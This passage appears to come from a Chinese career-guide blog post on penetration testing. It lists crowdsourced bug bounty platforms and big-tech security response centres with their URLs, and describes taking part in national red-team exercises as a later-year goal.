开始建立自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/3bc7983d3bac437fbcf8b3530e3ec8d3.png" width="23"/>目标：众测平台、企业src应急响应中心 
<table border="1" cellpadding="1" cellspacing="1"><tbody>|众测平台|URL
|漏洞盒子|[漏洞盒子 | 互联网安全测试众测平台](https://www.vulbox.com/)
|火线安全平台|[火线安全平台](https://www.huoxian.cn/)
|漏洞银行|[BUGBANK 官方网站 | 领先的网络安全漏洞发现品牌 | 开放安全的提出者与倡导者 | 创新的漏洞发现平台](https://www.bugbank.cn/)
|360漏洞众包响应平台|[360漏洞云漏洞众包响应平台](https://src.360.net/)
|补天平台（奇安信）|[补天 - 企业和白帽子共赢的漏洞响应平台，帮助企业建立SRC](https://www.butian.net/)
|春秋云测|[首页](https://zhongce.ichunqiu.com/)
|雷神众测（可信众测，安恒）|[雷神众测 - BountyTeam](https://www.bountyteam.com/)
|云众可信（启明星辰）|[云众可信 - 互联网安全服务引领者](https://www.cloudcrowd.com.cn/)
|ALLSEC|[ALLSEC](https://i.allsec.cn/#/)
|360众测|[360众测平台](https://zhongce.360.cn/)
|看雪众测（物联网）|[https://ce.kanxue.com/](https://ce.kanxue.com/)
|CNVD众测平台|[网络安全众测平台](https://zc.cnvd.org.cn/)
|工控互联网安全测试平台|[CNCERT工业互联网安全测试平台](https://test.ics-cert.org.cn/)
|慢雾（区块链）|[Submit Bug Bounty - SlowMist Zone - Blockchain Ecosystem Security Zone](https://slowmist.io/bug-bounty.html)
|平安汇聚|[http://isrc.pingan.com/homePage/index](http://isrc.pingan.com/homePage/index)
</tbody></table>


<table border="1" cellpadding="1" cellspacing="1"><tbody>|互联网大厂|URL
|阿里|https://asrc.alibaba.com/#/
|腾讯|https://security.tencent.com/
|百度|https://bsrc.baidu.com/v2/#/home
|美团|https://security.meituan.com/#/home
|360|https://security.360.cn/
|网易|https://aq.163.com/
|字节跳动|https://security.bytedance.com/
|京东|https://security.jd.com/#/
|新浪|http://sec.sina.com.cn/
|微博|https://wsrc.weibo.com/
|搜狗|http://sec.sogou.com/
|金山办公|https://security.wps.cn/
|有赞|https://src.youzan.com/
</tbody></table>

<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/18b63058b35848b19967730eb49fcb45.png" width="23"/>Third Year </h3>
学习最新的知识，建全自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/7ccb45a55d5244edad5a9a1fabc55f08.png" width="23"/>目标：参与护网（每一个男孩子心中的梦想） 
时间：一般5月面试，6/7月开始（持续2-3周）
分类：国家级护网、省级护网、市级护网、重大节日护网（如：建党、冬奥等）


### <img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>second year 

---

